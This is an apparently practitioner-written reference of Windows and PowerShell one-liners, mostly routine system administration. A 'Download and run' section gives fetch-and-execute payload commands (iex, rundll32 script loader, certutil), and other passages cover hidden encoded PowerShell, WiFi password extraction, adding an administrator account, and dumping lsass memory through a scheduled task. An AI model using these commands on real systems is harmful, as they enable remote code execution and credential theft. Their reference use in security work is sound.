One-liners commands
===================

Here are some useful short commands for Windows systems that may be useful.


Basic PowerShell commands
-------------------------

* ``sls`` (``Select-String``): look for a pattern.

  Example:

  .. code-block:: sh

      # Search my-needle in the input
      sls my-needle

      # Search my-needle in files ending with .txt
      sls -Path *.txt -Pattern my-needle

  Documentation:

  - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-6
  - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_regular_expressions?view=powershell-6

* ``gcm`` (``Get-Command``): List cmdlets (PowerShell commands) matching a pattern.

  Example:

  .. code-block:: sh

      # List commands using "WMI" in their names
      gcm -noun *WMI*

* Typing "Ctrl+Space" spawns PSReadLine module, which presents possible completion options (in a more powerful way than "Tab").

* Basic PowerShell constructions include:

  - ``ForEach-Object``, to perform an operation (between braces) on each item of an object (aliases: ``ForEach`` and ``%``)
  - ``Where-Object``, to filter an object (aliases: ``Where`` and ``?``)

PowerShell also provides commands to browse the filesystem.
Here is a correspondence table between PowerShell commands and commands from other systems, that are also available in PowerShell as aliases:

+-------------------------+--------------------------------------------------+----------------------------------------------+
|                         |                     Aliases                      |                                              |
|      cmdlet             +---------+-------------------+--------------------+ Description                                  |
|                         |   PS    | ``cmd.exe``       |   UNIX shell       |                                              |
+=========================+=========+===================+====================+==============================================+
| ``Get-Location``        | ``gl``  | ``pwd``           | ``pwd``            | Get the current node.                        |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Set-Location``        | ``sl``  | ``cd``, ``chdir`` | ``cd``, ``chdir``  | Change the current node.                     |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Get-ChildItem``       | ``gci`` | ``dir``           | ``ls``             | List the objects stored at the current node. |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``New-Item``            | ``ni``  | ``md``, ``mkdir`` | ``mkdir``          | Create a directory.                          |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Get-Item``            | ``gi``  |                   |                    | Return the properties of the current item.   |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Set-Item``            | ``si``  |                   |                    | Define the content of an item.               |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Copy-Item``           | ``cpi`` | ``copy``          | ``cp``             | Copy an object.                              |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Move-Item``           | ``mi``  | ``move``          | ``mv``             | Move an object.                              |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Rename-Item``         | ``rni`` | ``rn``            | ``ren``            | Rename an object.                            |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Remove-Item``         | ``ri``  | ``del``, ``rd``,  | ``rm``, ``rmdir``  | Remove an object.                            |
|                         |         | ``erase``         |                    |                                              |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Get-Content``         | ``gc``  | ``type``          | ``cat``            | Get the content of an object.                |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Set-Content``         | ``sc``  |                   |                    | Define the content of an object.             |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Get-ItemProperty``    | ``gp``  |                   |                    | Return a property.                           |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Copy-ItemProperty``   | ``cpp`` |                   |                    | Copy a property.                             |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Move-ItemProperty``   | ``mp``  |                   |                    | Move a property.                             |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Rename-ItemProperty`` | ``rnp`` |                   |                    | Rename a property.                           |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Compare-Object``      |         | ``compare``       | ``diff``           | Compare several objects.                     |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Write-Output``        |         | ``write``         | ``echo``           | Print something to the standard output.      |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Invoke-WebRequest``   | ``iwr`` |                   | ``curl``, ``wget`` | Perform a HTTP request.                      |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Get-Help``            |         | ``help``          | ``man``            | Get the help associated with a cmdlet.       |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+

PowerShell provides objects in several hierarchies, that are "drives" provided by "providers":

.. code-block:: sh

    Get-PSProvider
    Get-PSDrive

    # Get the version of PowerShell
    Get-Host
    $PSVersionTable.PSVersion

In order to use a drive, add a colon symbol to it:

.. code-block:: sh

    ls alias:
    ls env:
    ls variable:
    ls env:path
    ls function:h*
    cat function:help

    # In order to get $PATH:
    (ls env:path).value
    cat env:path
    echo $env:path

    # In order to set an environment variable globally, such as the one for Mirosoft symbols:
    setx _NT_SYMBOL_PATH srv*C:\DebugSymbols*http://msdl.microsoft.com/download/symbols

In order to use a provider, add two colons to it::

    ls registry::HKEY_USERS

Get the methods and properties:

.. code-block:: sh

    # For an object (instance of a class)
    $obj | Get-Member
    $obj | gm

    # For a class (for the static methods and properties)
    $obj | Get-Member -Static

Set the default output encoding to UTF-8 (cf. https://learn.microsoft.com/fr-fr/powershell/module/microsoft.powershell.core/about/about_character_encoding?view=powershell-7.3)

.. code-block:: sh

    $PSDefaultParameterValues['*:Encoding'] = 'utf8'

Download and run
----------------

Download and run a script

* PowerShell (``iex`` is an alias to ``Invoke-Expression``):

  .. code-block:: sh

      powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"

      powershell.exe -exec bypass "iex (New-Object Net.Webclient).DownloadString('http://webserver/payload.ps1')"

* JavaScript through Rundll32 (used by Win32/Poweliks malware):

  .. code-block:: sh

      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();

* Using ``certutil``:

  .. code-block:: sh

      certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe

Source: https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/amp/

Downloading files with PowerShell:

.. code-block:: sh

    $content = (New-Object Net.WebClient).DownloadString("http://webserver/file.txt")

    # Save to a file
    Invoke-WebRequest -Uri http://webserver/file.txt -OutFile file.txt -UseBasicParsing

    # With BITS (Background Intelligent Transfer Service) (ipmo = Import-Module)
    ipmo BitsTransfer;Start-BitsTransfer -Source "http://webserver/file.txt" -Destination C:\Windows\Temp\

Run a PowerShell script:

.. code-block:: sh

    %windir%\System32\WindowsPowerShell\v1.0\powershell.exe -Noninteractive -ExecutionPolicy Bypass -Noprofile -file MyScript.ps1

Run PowerShell code endoded as UTF-16LE+Base64:

.. code-block:: sh

    # start /B : start application without creating a new window
    # -nop for -NoProfile : do not load the PowerShell profile
    # -sta for -Sta : start using a single-threaded apartment
    # -noni for -NonInteractive : does not present an interactive prompt
    # -w 1 or -w hidden or -win Hidden for -WindowStyle Hidden : hidden PowerShell window
    # -enc for -EncodedCommand : execute the command encoded in base64
    # -ep bypass or -exec bypass for -ExecutionPolicy bypass : set the default execution
    #       policy for the current session and saves it in $env:PSExecutionPolicyPreference
    #       (redundant when -enc is given)
    start /b powershell -nop -sta -w 1 -enc "$(iconv -t utf16le < payload.ps1 | base64)"


Proxy settings
--------------

Get the HTTP proxy which is currently configured:

.. code-block:: sh

    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable
    netsh winhttp dump

Add a HTTP proxy:

.. code-block:: sh

    netsh winhttp set proxy 127.0.0.1:3128


WiFi profiles
-------------

List available WiFi profiles:

.. code-block:: sh

    netsh wlan show profiles

Export WiFi profiles (username and password) to ``%APPDATA%\<profile>.xml``:

.. code-block:: sh

    cmd.exe /c netsh wlan export profile key=clear folder="%APPDATA%"

Source: https://securelist.com/shedding-skin-turlas-fresh-faces/88069/

In PowerShell, without writing any file:

.. code-block:: sh

    $results = (netsh wlan show profiles) |
        Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} |
        %{(netsh wlan show profile name=$name key=clear)} |
        Select-String 'Key Content\W+\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} |
        %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}

    # Display the results or record them in files
    $results
    $results | Format-Table -Wrap
    $results | Format-Table -AutoSize
    $results | Out-GridView
    $results | Export-Csv -Path .\wifi.csv -NoTypeInformation -Encoding ASCII
    $results | Out-File -FilePath .\wifi.txt -Encoding ASCII

Sources:

* https://jocha.se/blog/tech/display-all-saved-wifi-passwords
* https://www.tenforums.com/tutorials/27997-see-wireless-network-security-key-password-windows-10-a.html
* https://community.idera.com/database-tools/powershell/ask_the_experts/f/learn_powershell_from_don_jones-24/19610/convert-one-liner-to-more-readable-code


User and group management
-------------------------

Some commands to list and manage users and groups

.. code-block:: sh

    # Get information on the current user
    whoami
    whoami /groups
    whoami /priv
    whoami /all

    # Local users and groups manager
    lusrmgr.msc

    # net command on local accounts
    net user
    net localgroup

    # net command on Active Directory accounts
    net user /domain
    net group

    # query command
    query user

    # Get information about the current sessions on a server
    qwinsta
    query session

    # PowerShell, with MS Exchange cmdlet
    # Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010
    Get-User | Export-CSV C:\Temp\AllUsers.csv -NoTypeInfo

    # WMI (PowerShell)
    Get-WmiObject Win32_UserAccount
    Get-CimInstance -ClassName Win32_UserAccount
    Get-CimInstance -ClassName Win32_Group

    # Add an administrator user
    net user newuser password /add
    net localgroup Administrators newuser /add

In Powershell, enabling autologin:

.. code-block:: sh

    $key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    Set-ItemProperty $key -Name AutoAdminLogon -Value 1
    Set-ItemProperty $key -Name DefaultUserName -Value "Administrateur"
    Set-ItemProperty $key -Name DefaultPassword -Value "password"

Spawn an elevated prompt when UAC is enabled (User Account Control):

.. code-block:: sh

    Start-Process -Verb RunAs PowerShell
    saps -verb runas powershell

In order to login as administrator to a remote machine without using the built-in administrator (RID 500), a registry key needs to be set.

.. code-block:: sh

    cmd /c reg add
      HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
      /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

    PowerShell Set-ItemProperty
        -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord

This has been described in many blog posts:

* https://support.microsoft.com/en-us/help/942817/how-to-change-the-remote-uac-localaccounttokenfilterpolicy-registry-se
* https://blogs.msdn.microsoft.com/wmi/2009/07/24/powershell-remoting-between-two-workgroup-machines/
* https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/


Enumerate live objects
----------------------

Enumerate all processes:

.. code-block:: sh

    tasklist /v
    query process *
    Get-Process
    # "gps" and "ps" are aliases of Get-Process

Find processes from its name:

.. code-block:: sh

    tasklist /v | find /I "explorer.exe"  # Only in cmd.exe, as "find" requires the quotes
    Get-Process | Select Name=explorer.exe

Enumerate all services:

.. code-block:: sh

    Get-Service | Export-CSV C:\Temp\AllServices.csv -NoTypeInfo
    gsv | epcsv C:\Temp\AllServices.csv -NoTypeInfo


Group Policy
------------

Edit Local Group Policy:

.. code-block:: sh

    # Local Group Policy Editor (with local GPO to Local Security Policy, Administrative Templates...)
    gpedit.msc
    # Local Security Policy (with SRP=Software Restriction Policies, AppLocker, Password Policies...)
    secpol.msc

For example to configure the servicing channel on Windows 10 (https://docs.microsoft.com/en-gb/windows/deployment/update/waas-servicing-channels-windows-10-updates):

* Open ``gpedit.msc`` (Local Group Policy Editor).
* Go to "Local Computer Policy/Computer Configuration/Administrative Templates/Windows Components/Windows Update/Windows Update For Business".
* Click on "Select when Preview Builds and Feature Updates are received". A dialog box opens.
* Select "Enabled" and choose a readiness level among "Preview Build - Fast", "Preview Build - Slow", "Release Preview", "Semi-Annual Channel (Targeted)" or "Semi-Annual Channel".
* Click on "OK".

Export the Local Group Policy:

.. code-block:: sh

    secedit /export /cfg system_config.cfg

    # With at least Windows Vista or Windows Server 2008
    gpresult /H GPReport.html
    gpresult /SCOPE COMPUTER /H GPReport-Computer.html

    # Display RSoP summary data (Resultant Set of Policies)
    gpresult /R

    # RSoP GUI
    RSOP.msc

Work on Group Policy Objects (GPO):

.. code-block:: sh

    # Launch the Group Policy Management Console
    gpmc.msc

    # Apply the GPO
    gpupdate /force

The Remote Server Administration Tools (RSAT) provides Group Policy PowerShell Cmdlets (https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/ee461027%28v=technet.10%29):

.. code-block:: sh

    Get-WindowsCapability -Online | ? Name -like 'Rsat.GroupPolicy.Management.Tools*'
    Get-GPOReport -All -ReportType Html -Path GpoReport.html

Logon scripts are located in folder ``%SystemRoot%\SYSVOL\sysvol\{domain DNS name}\Policies\{GUID of the GPO}\User\Scripts\Logon`` (on Domain controllers).
They can be implemented in VBScript (``.vbs`` extension) or PowerShell (``.ps1`` extension).
In GPMC, they are linked to a GPO using either:

* Computer Configuration -> Policies -> Windows Settings -> Scripts (Startup / Shutdown)
* User Configuration -> Policies -> Windows Settings -> Scripts (Logon/Logoff)

A third way of running scripts on a system consists in using Immediate Scheduled Tasks:

* Computer Configuration -> Preferences -> Control Panel Settings -> Scheduled Tasks


Scheduled tasks
---------------

In order to create a scheduled task that runs at 13:37 `ProcDump <https://docs.microsoft.com/en-us/sysinternals/downloads/procdump>`_ on ``lsass.exe`` (Local Security Authority Subsystem service process) and uploads the result onto a network share, `schtasks <https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks>`_ can be used:

.. code-block:: sh

    # /ru user context under which the task runs
    # /sc schedule frequency
    # /st start time in HH:mm format (24-hour time)
    #      Python: (datetime.datetime.now() + datetime.timedelta(minutes=2)).strftime("%H:%M")
    # /tn task name
    # /tr task to be run
    schtasks /create /tn "NameOfMyTask" /ru SYSTEM /sc once /st 13:37
        /tr "\\192.0.2.42\ro\procdump64.exe -accepteula -ma lsass.exe \\192.0.2.42\rw\lsass.dmp"

    # List tasks with their status and next run time
    schtasks


Software information
--------------------

In order to list the upgrades that have been applied, using DISM (Deployment Image Servicing and Management Tool):

.. code-block:: sh

    dism /online /get-packages

In order to check for an applied update, with its KB number:

.. code-block:: sh

    dism /online /get-packages | findstr KB99999

    # systeminfo.exe enumerates the "hotfixes" too
    systeminfo.exe | findstr KB99999

    # WMI also provides such an information in
    # System.Management.ManagementObject#root\CIMV2\Win32_QuickFixEngineering
    wmic qfe get hotfixid | find "KB99999"
    wmic qfe | find "KB99999"

    # From PowerShell
    Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid}

    # https://docs.microsoft.com/en-gb/powershell/module/Microsoft.PowerShell.Management/Get-HotFix?view=powershell-5.1
    Get-HotFix -id KB99999

The software may be signed using a certificate in a certificate store.

.. code-block:: sh

    # Manage user certificates
    certmgr.msc

    # Manage local machine certificates
    certlm.msc


Boot configuration
------------------

.. code-block:: sh

    msconfig

    bcdedit /enum all


Installed software
------------------

.. code-block:: sh

    wmic product get "name,version" /format:csv > applications.csv


Networking
----------

Get the current status of the network stack:

.. code-block:: sh

    # Get the configuration of all network adapters
    ipconfig /all

    # Display the content of the DNS client resolver cache
    ipconfig /displaydns

    # Get network routes
    route print

    # Show the active TCP connections and listening TCP and UDP ports, with PIDs
    netstat -ano

TCP port forwarding with netsh:

.. code-block:: sh

    netsh interface portproxy add v4tov4 listenport=1234 listenaddress=192.0.2.42
        connectport=80 connectaddress=10.13.37.1

On a WindowsDNS server:

.. code-block:: sh

    # Get server information
    dnscmd /info

    # Enumerate zones and records
    dnscmd /enumzones
    dnscmd /zoneprint ${ZONE_NAME}
    dnscmd /enumrecords ${ZONE_NAME} ${NODE_NAME}

To disable IPv6 on all network interfaces (with PowerShell):

.. code-block:: sh

    Get-NetAdapterBinding -ComponentID ms_tcpip6 | Where-Object { $_.Enabled } | ForEach-Object {
        Disable-NetAdapterBinding -Name $_.Name -ComponentID ms_tcpip6
        Get-NetAdapterBinding -Name $_.Name -ComponentID ms_tcpip6
    }
    # https://support.microsoft.com/en-gb/help/929852/guidance-for-configuring-ipv6-in-windows-for-advanced-users
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters" `
        /v DisabledComponents /t REG_DWORD /d 255 /f

To promote a Windows server (for example an evaluation install from https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022) to a Domain controller, first renaming it, in a PowerShell script (``.ps1`` file):

.. code-block:: sh

    # References:
    # - https://github.com/StefanScherer/adfs2/blob/master/scripts/create-domain.ps1
    # - https://github.com/commial/labs

    $dcname = "DCLAB"
    $domain = "mylab.local"
    $domainNetbios = "MYLAB"

    if ($env:COMPUTERNAME -ne $dcname) {
        Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Renaming the machine..."
        Rename-Computer $dcname
        Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Please reboot now! (shutdown /t 0 /r)"
        Exit
    }

    if ((Get-WmiObject Win32_ComputerSystem).partofdomain -eq $false) {
        Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) This system is not part of a domain, configuring a DC"

        Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Installing RSAT tools"
        Import-Module ServerManager
        Add-WindowsFeature RSAT-AD-PowerShell,RSAT-AD-AdminCenter

        Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Installing AD Domain Services"
        Install-WindowsFeature AD-domain-services

        Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Reconfiguring DNS server to localhost"
        $adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress }
        $adapters | ForEach-Object {
            $_.SetDNSServerSearchOrder("127.0.0.1")
        }

        Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Deploying an AD"
        Import-Module ADDSDeployment
        $PlainPassword = "Super!Password"
        $SecurePassword = $PlainPassword | ConvertTo-SecureString -AsPlainText -Force
        Install-ADDSForest `
            -SafeModeAdministratorPassword $SecurePassword `
            -CreateDnsDelegation:$false `
            -DatabasePath "C:\Windows\NTDS" `
            -DomainMode "Win2012" `
            -DomainName $domain `
            -DomainNetbiosName $domainNetbios `
            -ForestMode "Win2012" `
            -InstallDns:$true `
            -LogPath "C:\Windows\NTDS" `
            -NoRebootOnCompletion:$true `
            -SysvolPath "C:\Windows\SYSVOL" `
            -Force:$true

        Add-Content "C:\WINDOWS\System32\drivers\etc\hosts" "127.0.0.1  $dcname.$domain"

        Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Please reboot now! (shutdown /t 0 /r)"
        Exit
    }

    Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Checking AD services status..."
    $svcs = "adws","dns","kdc","netlogon"
    Get-Service -name $svcs -ComputerName localhost | Select Machinename,Name,Status

Then, Active Directory objects can be requested and created with:

- ``Get-ADOrganizationalUnit`` and ``New-ADOrganizationalUnit`` for organizational units (OU)
- ``Get-ADComputer`` and ``New-ADComputer`` for computers
- ``Get-ADUser`` and ``New-ADUser`` for users
- ``Get-ADGroup`` and ``New-ADGroup`` for groups, ``Add-ADGroupMember`` to add members to a group

Firewall
--------

.. code-block:: sh

    wf.msc

    Get-NetFirewallProfile
    Show-NetFirewallRule

    netsh advfirewall export "C:\Users\Administrator\Desktop\advfirewallpolicy.wfw"
    netsh advfirewall show allprofiles
    netsh advfirewall show global
    netsh advfirewall firewall dump

    # On old versions of Windows
    netsh advfirewall dump


Network shares
--------------

.. code-block:: sh

    # List the network shares currently used
    net use

    # List the shares on a server (use "localhost" for local shares)
    net view my-server /ALL

    # List the available shares (from a server)
    net share
    Get-SmbShareAccess C$

    # List shares using WMI (on a remote server or locally)
    $shares = Get-CIMInstance -Classname Win32_Share -computername my-server -filter "Type=0"
    $shares | foreach {
    "     Share Name   : " + $_.name + "
         Source Folder: " + $_.path + "
         Description  : " + $_.Description + "
         Caption      : " + $_.Caption + "
         Type         : " + ('0x{0:x}' -f $_.Type) + "
    "
    }

    # Mount a share to a drive letter
    net use /user:me Z: \\my-server\my-share
    New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\my-server\my-share"

In order to easily provide files to a Windows host from a Linux system, it is possible to use impacket to start a simple Samba server:

.. code-block:: sh

    smbserver.py -smb2support -username me -password mypass my-share /path/to/my-share


Other network commands
----------------------

Some scripts such as https://github.com/thom-s/netsec-ps-scripts/blob/master/printer-telnet-ftp-report/printer-telnet-ftp-report.ps1 use PowerShell cmdlets in order to perform connectivity tests:

.. code-block:: sh

    # Send a ping to the given IP address
    Test-Connection -ComputerName 192.0.2.42 -Quiet -Count 1 -InformationAction Ignore

    # Test telnet connectivity
    $result = Test-NetConnection -ComputerName 192.0.2.42 -Port 23
    $result.PingSucceeded
    $result.TcpTestSucceeded

    # Open a network socket to FTP port
    $client = New-Object System.Net.Sockets.TcpClient(192.0.2.42, 21)
    $client.Close()

Documentation:

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/test-connection?view=powershell-6
* https://docs.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection?view=win10-ps


Filesystem management
---------------------

Since Windows Vista, it is possible to create symbolic links on Windows:

.. code-block:: sh

    # Create a symbolic link to a file
    mklink "C:\Path\to\link\file" "C:\Path\to\target\file"

    # Create a symbolic link to a directory
    mklink /D "C:\Path\to\link\directory" "C:\Path\to\target\directory"

    # With PowerShell 5.0 (Windows 10)
    New-Item -Path "C:\Path\to\link" -ItemType SymbolicLink -Value "C:\Path\to\target"

The command to mount a volume on a path is `mountvol <https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mountvol>`_:

.. code-block:: sh

    # Example from Microsoft documentation
    mountvol \sysmount \\?\Volume\{2eca078d-5cbc-43d3-aff8-7e8511f60d0e}\

    # Enumerate the volumes from PowerShell
    Get-WmiObject Win32_Volume

It is also possible to associate a path with a drive letter using command `subst <https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/subst>`_:

.. code-block:: sh

    subst Z: "C:\my\path"

    # Remove the association
    subst Z: /d


Alternate Data Streams
----------------------

Get files with ``Zone.Identifier`` alternate data stream (ADS):

.. code-block:: sh

    Get-ChildItem -Recurse | Get-Item -Stream Zone.Identifier -ErrorAction SilentlyContinue |
        Select-Object FileName

Read an ADS:

.. code-block:: sh

    Get-Content -Stream Zone.Identifier .\my-application.exe

Remove an ADS:

.. code-block:: sh

    Remove-Item .\my-application.exe -Stream Zone.Identifier

When downloading a file from the Internet, ``dir`` shows a filename with suffix ``:Zone.Identifier:$DATA`` and with 26 bytes (each lines are ended by ``"\r\n"``:

.. code-block:: ini

    [ZoneTransfer]
    ZoneId=3

The Zone identifier is 0 for the local machine, 1 for the local intranet, 2 for trusted sites, 3 for the Internet or 4 for restricted sites.

The ADS ``Zone.Identifier`` may contain other fields such as ``ReferrerUrl=...``.

The empty ADS matches the usual content of a file. This means that the content is both accessible through ``filepath`` and ``filepath::$DATA``.


CSV and table viewer
--------------------

Display a simple CSV file in a simple GUI, from a PowerShell prompt:

.. code-block:: sh

    Import-Csv -Path file.csv | Out-GridView
    ipcsv -Path file.csv | ogv

In order to produce a CSV from a PowerShell command:

.. code-block:: sh

    ... | Sort-Object -Property Timestamp | Export-Csv file.csv -notypeinformation
    ... | sort -Property Timestamp | epcsv file.csv -notypeinformation

For a table in the CLI:

.. code-block:: sh

    ... | Format-Table
    ... | ft

    # Show all properties of the object
    ... | Format-Table -Property *
    ... | ft *

In order to show a table as a list:

.. code-block:: sh

    ... | Format-List
    ... | fl

    # Show all properties of the object
    ... | Format-List -Property *
    ... | fl *

In order to filter the properties of an object, it is possible to use ``Select-Object`` with filters (eg. ``Select-Object a*, b*`` for properties that start with "a" or "b").

``Select-Object`` can also be used to compute new properties.
For example, in order to compute a size in Gigabytes, it is possible to use the unit suffix ``GB`` and the format string ``{0:N2}`` which formats floats using 2 digits after the dot:

.. code-block:: sh

    Get-WmiObject Win32_DiskDrive |
      Select-Object Model,Status,@{Name='SizeGB';Expression={"{0:N2}" -f ($_.Size / 1GB)}}


WMI
---

WMI (Windows Management Instrumentation) provides information about many parts of the operating system:

.. code-block:: sh

    # Enumerate WMI providers
    Get-WmiObject -Class __Provider | ft

    # Get information about the OS
    gwmi Win32_OperatingSystem

    # Launch a GUI to enumerate WMI classes for known namespaces (and PowerShell ScriptOMatic)
    # In C:\Windows\System32\wbem\wbemtest.exe
    wbemtest.exe

In order to gather information about a Trusted Platform Module (TPM), the namespace needs to be changed:

.. code-block:: sh

    $tpm = Get-WmiObject -Namespace "root\CIMV2\Security\MicrosoftTpm" -Class Win32_Tpm
    $tpm.IsEnabled()
    $tpm.IsActivated()
    $tpm.IsOwned()
    $tpm.SelfTest()


MSSQL client
------------

In order to connect to a MSSQL server from a PowerShell CLI (cf. https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection?view=netframework-4.7.2):

.. code-block:: sh

    $ConnectionString = "Server=MSSQL-SRV\MY-INSTANCE;Database=mydb;User ID=sa;Password=sa;"
    $SqlConnection = New-Object System.Data.SqlClient.SqlConnection($ConnectionString)
    $SqlConnection.Open()
    $SqlConnection.State
    # Result: "Open"

To run a trivial SQL query:

.. code-block:: sh

    # The verbose way:
    $SqlCmd = New-Object System.Data.SqlClient.SqlCommand
    $SqlCmd.CommandText = "SELECT 42"
    $SqlCmd.Connection = $SqlConnection
    $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter
    $SqlAdapter.SelectCommand = $SqlCmd
    $DataSet = New-Object System.Data.DataSet
    $SqlAdapter.Fill($DataSet)
    $DataSet.Tables[0] | Format-Table

    # The more-compact way:
    $SqlCmd = New-Object System.Data.SqlClient.SqlCommand("SELECT 42", $SqlConnection)
    $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($SqlCmd)
    $DataSet = New-Object System.Data.DataSet
    $SqlAdapter.Fill($DataSet)
    $DataSet.Tables[0] | Format-Table

In order to find out which tables the logged user has access, here are some queries:

* ``SELECT * FROM sys.databases``
* ``SELECT * FROM sys.tables``

The following commands export the first rows of every table to files, once a ``$SqlConnection`` has been created:

.. code-block:: sh

    $SqlCmd = New-Object System.Data.SqlClient.SqlCommand("SELECT * FROM sys.tables", $SqlConnection)
    $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($SqlCmd)
    $DataSet = New-Object System.Data.DataSet
    $SqlAdapter.Fill($DataSet)
    $AllTables = $DataSet.Tables[0] | Sort-Object -property name

    $AllTables | ForEach-Object {
        $tblName = $_.name
        $csvName = "dump_top_" + $tblName + ".csv"
        echo "Exporting data to " $csvName
        $SqlCmd = New-Object System.Data.SqlClient.SqlCommand(("SELECT TOP 10000 * FROM " + $tblName), $SqlConnection)
        $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($SqlCmd)
        $DataSet = New-Object System.Data.DataSet
        $SqlAdapter.Fill($DataSet)
        $DataSet.Tables[0] | Export-Csv $csvName -notypeinformation
    }

On a SQL Server, it is also possible to create a virtual drive (cf. https://docs.microsoft.com/en-us/sql/powershell/navigate-sql-server-powershell-paths?view=sql-server-2017):

.. code-block:: sh

    New-PSDrive -Name MYDB -Root SQLSERVER:\SQL\localhost\DEFAULT\Databases\mydb
    Set-Location MYDB:\Tables\Users
